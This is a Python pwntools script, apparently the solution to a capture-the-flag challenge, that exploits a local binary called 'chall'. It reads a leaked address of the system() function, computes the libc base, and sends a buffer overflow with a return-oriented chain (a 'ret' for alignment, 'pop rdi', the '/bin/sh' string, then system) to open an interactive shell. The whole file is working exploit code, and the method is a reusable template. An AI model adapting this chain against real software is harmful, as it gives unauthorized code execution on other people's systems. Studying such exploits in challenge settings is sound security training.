from pwn import *
import os

os.chdir("attachment/program")
r = process("./chall")

r.recvuntil(b"it's at 0x")
system = int(r.recvline()[:-1], 16)

libc = system - 0x50D70

log.info(f"libc base: {hex(libc)}")

pop_rdi = libc + 0x2A3E5  # pop rdi; ret
binsh = libc + 0x1D8678

payload = b"A" * 0x28
payload += p64(pop_rdi + 1)  # ret (for stack alignment)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

r.sendlineafter(b"Surely that's not enough information to do anything else.\n", payload)

r.interactive()
